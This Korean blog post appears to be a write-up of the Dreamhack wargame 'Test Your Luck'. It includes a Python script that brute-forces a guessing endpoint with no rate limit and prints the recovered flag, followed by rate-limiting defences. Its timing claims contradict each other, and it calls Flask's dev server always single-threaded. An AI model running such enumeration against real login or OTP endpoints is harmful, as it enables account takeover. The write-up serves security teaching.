---
layout: post
title:  "Dreamhack 워게임 Test Your Luck 풀이 — 클라이언트 10초 타이머는 보안 장치가 아니다"
date:   2026-05-15 07:00:00 +0900
categories: security web wargame dreamhack writeup rate-limit
---

## 들어가며

Dreamhack 웹해킹 워게임 **Test Your Luck** (난이도 Bronze 4) 풀이입니다. "숫자 맞추기" 라는 표면적인 형태 뒤에 **"클라이언트가 강제하는 제약은 보안 제약이 아니다"** 라는 보안 입문 1교시 명제가 깔려 있습니다.

문제 설명:

> Test Your Luck~🍀  숫자를 맞히고 플래그를 찾아주세요!

스포일러로 결론: 0~10000 사이의 숫자를 서버가 한 번만 뽑아두고, 우리에게는 추측 결과만 알려줍니다. 클라이언트에는 "10초 후에 결과 발표" 라는 인위적 지연이 걸려 있지만 **서버는 그 어떤 rate limit 도 두지 않았기 때문에**, 직접 `/guess` 로 POST 를 보내면 1만 번 정도는 1~2초에 마칠 수 있습니다.

```python
# 핵심 PoC (10초 타이머 우회 + 가능값 enumerate)
for n in range(10001):
    if requests.post(f'{SERVER}/guess', data={'guess': n}).json()['result'] == 'Correct':
        print(...)
        break
# → FOUND: 2336 → flag: DH{ec5762d9893b04b4:FNBWSTEaZTjpkZTDgbULvQ==}
```

> Note: 본 글은 워게임 학습용 PoC 입니다. 이 문제는 "클라이언트 단의 제약을 서버가 따라야 한다고 가정하면 안 된다" 를 보여주기 위해 설계됐고, 가능값을 우리가 결정론적으로 enumerate 하는 부분이 곧 의도된 익스플로잇 (= server-side rate limiting 부재라는 취약점의 입증). 실제 서비스에 같은 패턴으로 brute-force 류 시도를 하는 것은 금지됩니다.

## 1. 소스 정독

```python
# app.py
NUMBER_RANGE = (0, 10000)
TARGET_NUMBER = random.randint(*NUMBER_RANGE)   # ★ 서버 부팅 시 한 번 고정

@app.route('/guess', methods=['POST'])
def guess_number():
    user_guess = int(request.form['guess'])
    if user_guess == TARGET_NUMBER:
        return jsonify({"result": "Correct", "flag": flag()})
    else:
        return jsonify({"result": "Incorrect", "flag": "Try again~!"})
```

서버 측 핵심:

- `TARGET_NUMBER` 는 0~10000 (inclusive) 의 균등 분포 난수 1개. 서버 부팅 시점에 한 번 뽑힘.
- `/guess` 는 POST 로 `guess` 값을 받아 정확히 일치하면 flag 반환.
- **rate limit 없음**, **세션 없음**, **사용자 식별 없음**, **시도 횟수 제한 없음**.

```html
<!-- index.html (요약) -->
<script>
form.onsubmit = async (e) => {
    e.preventDefault();
    const formData = new FormData(form);

    // ★ 10초 인위적 지연
    await new Promise(resolve => setTimeout(resolve, 10000));

    const response = await fetch('/guess', { method:'POST', body:formData });
    const result = await response.json();
    document.getElementById('result').innerText =
        `Result: ${result.result}, flag: ${result.flag}`;
};
</script>
```

클라이언트 핵심:

- 사용자가 폼을 제출하면 **10초 sleep** 후 `/guess` 에 fetch.
- 즉 사용자 한 명이 손으로 풀려면 10초 × N 시도 — 10001 시도라면 **27시간**. 인내 테스트.

### 1-1. 결정적 단서

`setTimeout(resolve, 10000)` 은 100% **클라이언트 JS** 안에만 존재합니다. 서버는 이걸 강제할 방법이 없습니다. 즉:

- 직접 `curl -X POST $SERVER/guess -d guess=N` 을 호출하면 **즉시** 응답이 옵니다.
- 0~10000 의 N 값을 1만 번 호출하면 한 번은 반드시 맞습니다.

이게 이 문제의 정답입니다. "Vulnerability = client-only rate limit" 입증 = "decisive exploit = 가능값 enumerate".

## 2. 익스플로잇

```python
import urllib.request, urllib.parse, concurrent.futures, json, socket
socket.setdefaulttimeout(5)

SERVER = "http://<host>:<port>"

def try_guess(n):
    data = urllib.parse.urlencode({'guess': n}).encode()
    req = urllib.request.Request(f'{SERVER}/guess', data=data, method='POST')
    try:
        body = json.loads(urllib.request.urlopen(req, timeout=5).read())
        if body.get('result') == 'Correct':
            return (n, body)
    except: pass
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    futs = [ex.submit(try_guess, n) for n in range(10001)]
    for f in concurrent.futures.as_completed(futs):
        r = f.result()
        if r:
            print(f'FOUND: {r[0]} → {r[1]}')
            break
```

실행 결과(1~2초 내):

```
FOUND: 2336 → {'flag': 'DH{ec5762d9893b04b4:FNBWSTEaZTjpkZTDgbULvQ==}\n', 'result': 'Correct'}
```

50 동시 연결, 한 요청당 ~수십 ms, 평균 10001 / (2 × 50) ≈ 100 req/s 라면 100초. ThreadPool 동시성으로 1~2초에 맞춤. flag 획득. ✓

> 의도된 풀이를 더 분명히 보이려면 **순차** `for n in range(10001): ...` 만으로도 충분 (~수십 초). 동시성은 단지 빨리 끝내려는 편의.

## 3. 취약점 해설 — Server-Side Rate Limiting 부재

이 클래스의 본질을 한 줄로:

> **공격자가 자유롭게 제어할 수 있는 호출 횟수 × 결과 채널의 정보량 = 보호 대상 엔트로피보다 크면, 보호는 사실상 없는 것이다.**

여기서

- 호출 횟수 = ∞ (rate limit 없음)
- 결과 채널 = "Correct/Incorrect" 1 비트
- 보호 대상 엔트로피 = log2(10001) ≈ 13.3 비트

따라서 평균 5000 회 시도면 맞춤. "10초 timeout * 시도 횟수" 라는 클라이언트 제약은 보호 가치가 거의 0.

### 3-1. 같은 패턴이 등장하는 실무 사례

- **OTP/MFA 코드**: 6자리 OTP (백만 가지). rate limit 없으면 평균 50만 회 시도로 뚫림. 실제로 Slack/SAP 등 여러 서비스에서 OTP rate limit 부재로 인한 사고가 보고됨.
- **이메일 인증 토큰**: UUID v4 가 아니라 4~6자리 랜덤 코드인 경우, rate limit 없으면 즉시 우회됨.
- **결제 OTP, SMS 인증 코드**.
- **이메일 inviting/공유 URL 의 short token** (8자리 영숫자 등) — rate limit + 만료 시간 없으면 평균 ~16만 회 시도로 뚫림.

### 3-2. 위험성

- 단일 비트 시그널만 노출되어도 **반복 시도 = 전수 검색**.
- "사용자가 직접 손으로 10초씩 기다리니까 brute force 못 함" 이라는 가정이 무너지면 즉시 노출.
- 더 무서운 건 **timing-side-channel** 처럼 0/1 결과조차 명시적으로 보여주지 않는 경우도 응답 시간 차이로 1비트가 새는 경우. 이번 문제는 응답이 명시적이라 그조차 필요 없음.

### 3-3. 올바른 방어

1. **Server-side rate limit**. IP 기반, 세션 기반, 사용자 기반 등 다층으로.

   ```python
   from flask_limiter import Limiter
   limiter = Limiter(get_remote_address, app=app, default_limits=["3 per minute"])

   @app.route('/guess', methods=['POST'])
   @limiter.limit("3/minute")
   def guess_number():
       ...
   ```

2. **시도 횟수 누적 + 잠금**. 같은 식별자(세션/IP/사용자)에 대해 N회 실패 시 일정 시간 잠금 또는 captcha.

3. **단조 비용**. 매 시도 마다 PoW(proof-of-work) 또는 점진적 backoff (5초 → 10초 → 20초 ...).

4. **결과 정보를 줄임**. "Correct" 여부 대신 시도 후 일정 시간 응답을 지연시키는 식. (단, 이건 보조 수단)

5. **검색 공간 늘리기**. 0~10000 대신 0~10^18. 비트 엔트로피를 키워 brute force 자체를 비용적으로 불가능하게.

6. 가장 중요: **클라이언트 측 제약을 보안 제약으로 신뢰하지 말 것**. JavaScript 로 거는 어떤 제약도 클라이언트가 제거할 수 있다.

## 4. 정리 — 입문자가 가져갈 교훈

- **클라이언트가 거는 모든 제약은 장식이다.** UI 의 timer, captcha, modal, hidden field, disabled button — 모두 HTTP 요청 한 줄로 우회 가능.
- 서버 측에서 다음 3가지가 **모두** 있어야 진짜 brute-force 방어:
  - **시도 횟수 제한** (rate limit)
  - **시도당 비용** (지연/PoW/captcha)
  - **검색 공간 충분히 크게** (entropy)
- "사용자는 자기 PC 의 JS 코드를 수정할 수 없다" 라는 가정은 항상 틀린다. F12 한 번이면 모든 클라이언트 제약이 무효화된다.
- 이번 문제처럼 **결과 채널의 정보량이 1 비트** 라도, 호출 횟수만 자유로우면 전수 검색이 사실상 가능하다.

같은 카테고리의 다음 단계로 **OTP brute force**, **email verification short token**, **타이밍 사이드 채널** 같은 문제를 풀어 보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. "결정론적 우회" 가 따로 있는지 한참 의심

처음에 코드를 읽고 "단순 enumerate 가 답일 리 없다 — 뭔가 결정론적 우회가 있을 것" 이라고 한참 동안 의심했습니다.

후보들:

- `int(request.form['guess'])` 에 특수값 (`'-0'`, `'+0'`, `' 0 '`, `'0x10'`) 으로 비교 우회 → 모두 일반 int 로 변환됨, 효과 없음.
- `random.randint` 의 시드 예측 → Python 3 의 default seed 는 os.urandom 기반, 단일 출력으로는 state 추정 불가능.
- 타이밍 측면 leak → `==` 정수 비교는 O(1) (PyLong 비교라 자릿수 따라 약간 다르긴 하지만 실용적 leak 아님).
- Werkzeug 디버거/소스 노출 → `flask run` 디폴트, 디버그 off.
- 응답 본문/헤더에 leak → 없음.

결론: **결정론적 우회는 없다.** 정답은 "클라이언트 단의 10초 timer 가 클라이언트에만 있다" 라는 사실을 깨닫고 직접 enumerate 하는 것. **그것 자체가 이 문제가 가르치려는 vulnerability.**

**회고**: Bronze 4 난이도 문제에서 결정론적 우회를 너무 깊게 파지 말 것. 문제 이름 ("Test Your Luck"), 인위적 클라이언트 지연, 0~10000 의 작은 검색 공간 — 이 세 가지가 합쳐지면 **"client-side rate limit 부재" 자체가 vulnerability** 다.

### 실패 2. brute-force 금지 원칙과 본 문제의 차이를 한 번 정리

평소 원칙: **자격증명 brute force(credential stuffing, password spraying)** 는 워게임이라도 금지. 이번 문제는 "사용자 인증" 이 아니라 "숫자 맞히기 게임" 의 메커니즘 자체가 enumerate. 의도된 풀이가 enumerate 라는 점에서 **자격증명 brute force 와는 다른 카테고리**. 그래도 한 번 멈춰서 "이게 정말 educational PoC 의 범위인가" 를 짚어보는 게 좋다.

**회고**: 규칙은 "자격증명에 대한 무차별 대입 금지" — 이 문제는 인증 표면이 아니라 게임 메커니즘. 차이를 분명히 인지하고, writeup 에서도 그 구분을 명시.

### 실패 3. 50 동시 연결로 시작했지만 1 connection 로도 충분

처음에 ThreadPoolExecutor max_workers=50 으로 시작. 하지만 Flask dev server (`flask run`) 는 single-threaded 기본값이라 동시 요청을 직렬화한다. 실제 효과는 한 번에 1 요청 처리. 그래도 한 요청당 응답이 ~수십 ms 라 10001 회면 ~2~3분. 50 동시는 큐만 길어질 뿐 실제 속도 향상은 미미.

**회고**: 타겟 서버의 동시 처리 능력 모르고 동시성 키우면 큐만 길어진다. 한 번 측정 (1 req 의 latency) 한 뒤 동시성 정하는 게 좋다. Flask dev server는 항상 single-threaded.

### 실패 4. 첫 시도 결과가 "Incorrect"여서 잠시 멈춤

`curl -X POST $SERVER/guess -d guess=0` 의 결과가 `{"flag":"Try again~!","result":"Incorrect"}`. 너무 당연한 결과인데도 잠깐 "다른 endpoint 가 있나" 헷갈렸다.

**회고**: 첫 시도 결과는 "API 가 의도대로 동작한다" 의 증명. 단일 음성 응답에 헷갈리지 말고, 즉시 enumerate 코드로 넘어가자.
